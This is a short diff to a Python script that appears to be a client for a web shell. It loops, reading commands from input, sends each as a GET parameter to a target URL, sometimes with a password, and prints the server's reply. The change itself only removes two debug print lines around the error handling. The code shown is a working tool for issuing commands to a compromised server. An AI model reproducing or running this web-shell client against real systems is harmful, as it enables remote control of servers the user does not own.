@@ -17,12 +17,10 @@ while True:
             req = requests.get(args.target_url, params={'password': args.password, args.shell_name: str(input(str(args.shell_name)))})
             print(req.text)
         except:
-            print("except 1")
             exit(1)
     else:
         try:
             req = requests.get(args.target_url, params={args.shell_name: str(input(str(args.shell_name)))})
             print(req.text)
         except:
-            print("except 2")
             exit(1)
